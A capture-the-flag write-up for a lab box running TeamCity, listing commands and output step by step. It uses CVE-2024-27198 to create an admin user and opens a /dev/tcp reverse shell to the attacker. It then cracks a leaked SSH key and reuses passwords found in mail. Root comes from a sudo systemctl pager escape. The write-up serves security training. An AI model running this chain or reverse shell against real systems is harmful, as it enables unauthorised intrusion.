# CTF Writeup: Scrutiny

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.129.91
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-30 05:48 -0500
Nmap scan report for 192.168.129.91
Host is up (0.032s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
25/tcp  open   smtp    Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=onlyrands.com
| Subject Alternative Name: DNS:onlyrands.com
| Not valid before: 2024-06-07T09:33:24
|_Not valid after:  2034-06-05T09:33:24
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-title: OnlyRands
|_http-server-header: nginx/1.18.0 (Ubuntu)
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   30.76 ms 192.168.45.1
2   30.75 ms 192.168.45.254
3   30.82 ms 192.168.251.1
4   30.90 ms 192.168.129.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.62 seconds
```

Observing the webpage on port 80, we identified an login tab. Upon pressing it we are getting forwarded to an subdomain named "teams.onlyrands.com". Let's map it to our target ip in our local dns file /etc/hosts.

```
sudo echo "192.168.129.91 onlyrands.com teams.onlyrands.com" | sudo tee -a /etc/hosts
```

After inspecting the subdomain, we are getting greeted by an login panel and an web application running called "TeamCity 2023.05.4".

## Vulnerability Assessment

Let's search for CVE's.

Utilized the following exploit.

```
git clone https://github.com/Chocapikk/CVE-2024-27198.git    
Cloning into 'CVE-2024-27198'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 14 (delta 3), reused 14 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (14/14), 8.04 KiB | 8.04 MiB/s, done.
Resolving deltas: 100% (3/3), done.
```

Since we will have to install dependecies, we will have to first create an virtual environment.

```
python3 -m venv myenv
source myenv/bin/activate
```

Downloaded dependencies.

```
pip install -r requirements.txt
Collecting alive_progress==3.1.4 (from -r requirements.txt (line 1))
  Downloading alive_progress-3.1.4-py3-none-any.whl.metadata (68 kB)
Collecting prompt_toolkit==3.0.36 (from -r requirements.txt (line 2))
  Downloading prompt_toolkit-3.0.36-py3-none-any.whl.metadata (7.0 kB)
Collecting requests==2.25.1 (from -r requirements.txt (line 3))
  Downloading requests-2.25.1-py2.py3-none-any.whl.metadata (4.2 kB)
Collecting rich==13.7.1 (from -r requirements.txt (line 4))
  Downloading rich-13.7.1-py3-none-any.whl.metadata (18 kB)
Collecting urllib3==1.26.12 (from -r requirements.txt (line 5))
  Downloading urllib3-1.26.12-py2.py3-none-any.whl.metadata (47 kB)
Collecting about-time==4.2.1 (from alive_progress==3.1.4->-r requirements.txt (line 1))
  Downloading about_time-4.2.1-py3-none-any.whl.metadata (13 kB)
Collecting grapheme==0.6.0 (from alive_progress==3.1.4->-r requirements.txt (line 1))
  Downloading grapheme-0.6.0.tar.gz (207 kB)
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Collecting wcwidth (from prompt_toolkit==3.0.36->-r requirements.txt (line 2))
  Using cached wcwidth-0.2.14-py2.py3-none-any.whl.metadata (15 kB)
Collecting chardet<5,>=3.0.2 (from requests==2.25.1->-r requirements.txt (line 3))
  Downloading chardet-4.0.0-py2.py3-none-any.whl.metadata (3.5 kB)
Collecting idna<3,>=2.5 (from requests==2.25.1->-r requirements.txt (line 3))
  Downloading idna-2.10-py2.py3-none-any.whl.metadata (9.1 kB)
Collecting certifi>=2017.4.17 (from requests==2.25.1->-r requirements.txt (line 3))
  Using cached certifi-2025.11.12-py3-none-any.whl.metadata (2.5 kB)
Collecting markdown-it-py>=2.2.0 (from rich==13.7.1->-r requirements.txt (line 4))
  Using cached markdown_it_py-4.0.0-py3-none-any.whl.metadata (7.3 kB)
Collecting pygments<3.0.0,>=2.13.0 (from rich==13.7.1->-r requirements.txt (line 4))
  Using cached pygments-2.19.2-py3-none-any.whl.metadata (2.5 kB)
Collecting mdurl~=0.1 (from markdown-it-py>=2.2.0->rich==13.7.1->-r requirements.txt (line 4))
  Using cached mdurl-0.1.2-py3-none-any.whl.metadata (1.6 kB)
Downloading alive_progress-3.1.4-py3-none-any.whl (75 kB)
Downloading prompt_toolkit-3.0.36-py3-none-any.whl (386 kB)
Downloading requests-2.25.1-py2.py3-none-any.whl (61 kB)
Downloading urllib3-1.26.12-py2.py3-none-any.whl (140 kB)
Downloading rich-13.7.1-py3-none-any.whl (240 kB)
Downloading about_time-4.2.1-py3-none-any.whl (13 kB)
Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
Using cached pygments-2.19.2-py3-none-any.whl (1.2 MB)
Using cached certifi-2025.11.12-py3-none-any.whl (159 kB)
Using cached markdown_it_py-4.0.0-py3-none-any.whl (87 kB)
Using cached mdurl-0.1.2-py3-none-any.whl (10.0 kB)
Using cached wcwidth-0.2.14-py2.py3-none-any.whl (37 kB)
Building wheels for collected packages: grapheme
  Building wheel for grapheme (pyproject.toml) ... done
  Created wheel for grapheme: filename=grapheme-0.6.0-py3-none-any.whl size=210136 sha256=1353093a02ae695a02010816f0838beccecca07b67547ed78a0ab663aa320662
  Stored in directory: /root/.cache/pip/wheels/e0/96/66/ab223d7755e401981953430b7f2d562afba01a71296a74c893
Successfully built grapheme
Installing collected packages: grapheme, wcwidth, urllib3, pygments, mdurl, idna, chardet, certifi, about-time, requests, prompt_toolkit, markdown-it-py, alive_progress, rich
Successfully installed about-time-4.2.1 alive_progress-3.1.4 certifi-2025.11.12 chardet-4.0.0 grapheme-0.6.0 idna-2.10 markdown-it-py-4.0.0 mdurl-0.1.2 prompt_toolkit-3.0.36 pygments-2.19.2 requests-2.25.1 rich-13.7.1 urllib3-1.26.12 wcwidth-0.2.14
```

Ran exploit and gained weak shell.

```
python3 exploit.py --url http://teams.onlyrands.com --add-user
[+] User created successfully. Username: f5r3elmv, ID: 22, Password: osHP0pQ7EC
[+] Token created successfully for user ID: 22. Token Name: WnChmRPIfS, Token: 
eyJ0eXAiOiAiVENWMiJ9.TnNsREoxT2NIRExOckhsck5XUEFiYUVpamc0.MTk5MDBjNTItMWZkNC00NmE2LTk3YWUtZjI5ZTMwZTdkNTVj
[+] Internal properties modified successfully.
[!] Shell is ready, please type your commands UwU
$
```

I need to escape this weak shell, let's upgrade to an better.

Started up my listener on port 80.

```
nc -lvnp 80
```

Executed the following command in the shell.

```
$ /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.219/80 0>&1'
```

Gained RCE as user "git".

```
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.219] from (UNKNOWN) [192.168.129.91] 59000
bash: cannot set terminal process group (792): Inappropriate ioctl for device
bash: no job control in this shell
git@onlyrands:~/software/TeamCity/bin$
```

Retrieved local.txt in /srv/git directory.

```
c18366401c808c7101e416036b41e8a7
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated Users on the Target.

```
git@onlyrands:~/software/TeamCity/bin$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
offsec:x:1000:1000:,,,:/home/offsec:/bin/bash
edgarm:x:1001:1001:Edgar Macejkovic,,,:/home/administration/edgarm:/bin/bash
sonjas:x:1002:1001:Sonja Stamm,,,:/home/administration/sonjas:/bin/bash
briand:x:1003:1001:Brian Dach,,,:/home/administration/briand:/bin/bash
bobbyp:x:1004:1002:Bobby Pfannerstill,,,:/home/operations/bobbyp:/usr/bin/bash
susanw:x:1006:1002:Susan Ward,,,:/home/operations/susanw:/usr/bin/bash
dont:x:1007:1003:Don Tremblay,,,:/home/finance/dont:/usr/bin/bash
juliuso:x:1009:1003:Julius Olson-Rogahn,,,:/home/finance/juliuso:/usr/bin/bash
matthewa:x:1010:1004:Matthew Armstrong,,,:/home/freelancers/matthewa:/usr/bin/bash
patriciam:x:1011:1004:Patricia Morissette,,,:/home/freelancers/patriciam:/usr/bin/bash
marcot:x:1012:1004:Marco Tillman,,,:/home/freelancers/marcot:/usr/bin/bash
kathleenw:x:1013:1004:Kathleen Wisoky,,,:/home/freelancers/kathleenw:/usr/bin/bash
williamw:x:1014:1004:William Walter,,,:/home/freelancers/williamw:/usr/bin/bash
git:x:1015:1005:Git Server,,,:/srv/git:/bin/bash
```

I wasn't able to find anything on the server to escalate privs, so let's go back to one thing we didn't do. We accessed the TeamCity CMS with the user which got created by the exploit: 9mdqj3zj:ox27W2s8tw

After inspecting all the commits, from the freelancers. We observed that marco had an commit named "Oops", in which he pushed his private ssh key onto the remote repository.

Retrieved private ssh key of user "marcot".

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
nDRMyT9EHV94yVIeYQzmagUFXqPqFVMSM=
-----END OPENSSH PRIVATE KEY-----
```

Trying to access the system with this ssh key didn't work. Let's try and bruteforce an password out of this ssh key! 

1. We first need to convert the ssh key to hash.

```
ssh2john id_rsa > ssh_hash
```

2. Bruteforced the hash value and retrieved password for marcot:cheer

```
john ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cheer            (id_rsa)     
1g 0:00:00:29 DONE (2025-12-30 06:56) 0.03416g/s 41.54p/s 41.54c/s 41.54C/s 753951..buttons
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Logged into user "marcot".

```
git@onlyrands:/var$ su marcot
Password: 
marcot@onlyrands:/var$
```

Enumerated mails in /var/mail/marcot.

```
marcot@onlyrands:/var/mail$ cat marcot
From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
Return-Path: <matthewa@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1010)
        id E8D713650; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
From: matthewa@onlyrands.com
To: marcot@onlyrands.com
Subject: Goodbye, best friend
Date: Fri,  18 Feb 2022 08:43:11 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093348.E8D713650@onlyrands.com>

Marco,

Dach, the imbecile, forgot to disable my access, so you can login using my account. The password is "IdealismEngineAshen476" (without the quotation marcot).

I've left you a parting gift--your eyes only.
I'm gonna miss you, pal. Catch you on the flip side.

Sincerely,
Matthew A.

From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
Return-Path: <matthewa@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1010)
        id F07F4366A; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
From: matthewa@onlyrands.com
To: kathleenw@onlyrands.com, marcot@onlyrands.com,
    matthewa@onlyrands.com, patriciam@onlyrands.com
Subject: Goodbye!
Cc: bobbyp@onlyrands.com, danab@onlyrands.com, susanw@onlyrands.com
Date: Fri,  18 Feb 2022 08:50:03 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093348.F07F4366A@onlyrands.com>

Dear randos,

Like most things in life, good things must come to an end. My access has been terminated, so I thought I'd send you this very last email to say goodbye.

You have been like a family to me for as long as I can remember, and since our we're not supposed to communicate outside of work, I hope that maybe one day you will remember me.

Marco, I have faith you will become an excellent leader for the team.

Take care, everyone. Goodbye!

Sincerely,
Matthew A.

From marcot@onlyrands.com  Fri Jun  7 09:33:49 2024
Return-Path: <marcot@onlyrands.com>
X-Original-To: freelancers
Delivered-To: freelancers@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1012)
        id 0555F367C; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
From: marcot@onlyrands.com
To: williamw@onlyrands.com
Subject: Welcome, new freelancer!
Cc: operations@onlyrands.com, freelancers@onlyrands.com
Date: Mon,  21 Feb 2022 09:26:56 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093349.0555F367C@onlyrands.com>

Hi William,

Welcome to the team. I just talked to Sonja about giving you a virtual tour of what we do at OnlyRands, so please be ready to go once Kathleen's given you the orientation session on how to use TeamCity.

Best,
Marco T.

From edgarm@onlyrands.com  Fri Jun  7 09:33:49 2024
Return-Path: <edgarm@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1001)
        id 0D5E136A0; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
From: edgarm@onlyrands.com
To: marcot@onlyrands.com
Subject: Congratulations
Date: Mon,  21 Feb 2022 11:07:49 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093349.0D5E136A0@onlyrands.com>

Hi Marco,

Congratulations on your promotion to department chief. I trust you will have William W. under control, as well as your shameful numbers. Get work done.

Regards,
Macejkovic

From sonjas@onlyrands.com  Fri Jun  7 09:33:49 2024
Return-Path: <sonjas@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1002)
        id 1C94636A0; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
From: sonjas@onlyrands.com
To: marcot@onlyrands.com
Subject: FIX YOUR NUMBERS
Date: Thu,  24 Feb 2022 16:24:51 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093349.1C94636A0@onlyrands.com>

Marco,

If you don't get those numbers up by the end of the quarter, you and your team are going to make up for it in unpaid overtime.

Regards,
Stamm
```

Retrieved Credentials matthewa:IdealismEngineAshen476

Logged into user "matthewa".

```
marcot@onlyrands:/var/mail$ su matthewa
Password: 
matthewa@onlyrands:/var/mail$
```

Upon analyzing matthewa's directory I found an interesting file called .~

```
matthewa@onlyrands:~$ ls -la
total 44
drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 .
drwxrwxr-x+ 7 root     root        4096 Jun  7  2024 ..
-r--------+ 1 matthewa freelancers  120 Jun  7  2024 .~
-rw-rwxr--+ 1 matthewa freelancers  220 Jun  7  2024 .bash_logout
-rw-rwxr--+ 1 matthewa freelancers 3790 Jun  7  2024 .bashrc
-rw-rw----+ 1 matthewa freelancers  119 Jun  7  2024 .gitconfig
-rw-rwxr--+ 1 matthewa freelancers  807 Jun  7  2024 .profile
drwxrwx---+ 3 matthewa freelancers 4096 Jun  7  2024 work
```

Viewing it provided us with credentials.

```
matthewa@onlyrands:~$ cat .~
Dach's password is "RefriedScabbedWasting502". I saw it once when he had to use my terminal to check TeamCity's status.
```

Logged in as user "briand".

```
matthewa@onlyrands:~$ su briand
Password: 
briand@onlyrands:/home/freelancers/matthewa$
```

Upon inspecting, which sudo permissions the user "briand" has, we found out that he is able to run the systemctl binary on the teamcity-server.service.

Let's enumerate the binary.

```
briand@onlyrands:/home/freelancers/matthewa$ /usr/bin/systemctl --version
systemd 245 (245.4-4ubuntu3.23)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```

Let's search up for exploits for "systemd 245".

Rhel 8.x and ubuntu use 20.x systemd 245. System 245 does not check the eUID and UID , which coupled with misconfig in /etc/sudoers allows for local privilege escalation. This works not only with systemctl status, but also with the other commands that systemd supplies.

I added !/bin/bash to the end and obtained root shell.

```
briand@onlyrands:/home/freelancers/matthewa$ sudo /usr/bin/systemctl status teamcity-server.service
● teamcity-server.service - TeamCity Server
     Loaded: loaded (/lib/systemd/system/teamcity-server.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2024-08-05 17:12:08 UTC; 1 years 4 months ago
   Main PID: 852 (sh)
      Tasks: 161 (limit: 2255)
     Memory: 1.4G
     CGroup: /system.slice/teamcity-server.service
             ├─ 852 sh teamcity-server.sh _start_internal
             ├─ 863 sh /srv/git/software/TeamCity/bin/teamcity-server-restarter.sh run
             ├─1192 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/srv/git/software/TeamCity/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.Clas>
             ├─1785 /usr/lib/jvm/java-11-openjdk-amd64/bin/java -DTCSubProcessName=TeamCityMavenServer -classpath /srv/git/software/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/plexus-componen>
             ├─3626 /bin/bash -c bash -i >& /dev/tcp/192.168.45.219/80 0>&1
             ├─3628 bash -i
             ├─3852 python3 -c import pty;pty.spawn("/bin/bash")
             ├─3853 /bin/bash
             ├─4389 /bin/bash -c bash -i >& /dev/tcp/192.168.45.219/80 0>&1
             ├─4391 bash -i
             ├─4415 python3 -c import pty;pty.spawn("/bin/bash")
             └─4416 /bin/bash

Aug 05 17:12:08 onlyrands.com systemd[1]: Starting TeamCity Server...
Aug 05 17:12:08 onlyrands.com teamcity-server.sh[792]: Spawning TeamCity restarter in separate process
Aug 05 17:12:08 onlyrands.com teamcity-server.sh[792]: TeamCity restarter running with PID 852
Aug 05 17:12:08 onlyrands.com systemd[1]: Started TeamCity Server.
Dec 30 11:11:04 onlyrands.com sudo[3756]: pam_unix(sudo:auth): conversation failed
Dec 30 11:11:04 onlyrands.com sudo[3756]: pam_unix(sudo:auth): auth could not identify password for [git]
Dec 30 11:11:04 onlyrands.com sudo[3756]:      git : command not allowed ; TTY=unknown ; PWD=/srv/git/freelancers ; USER=root ; COMMAND=list
Dec 30 11:57:08 onlyrands.com su[5800]: (to marcot) git on pts/1
Dec 30 11:57:09 onlyrands.com su[5800]: pam_unix(su:session): session opened for user marcot by (uid=1015)
!/bin/bash
root@onlyrands:/home/freelancers/matthewa#
```

Retrieved proof.txt in /root directory.

```
19f0c61287d977134ffde5c428d07059
```
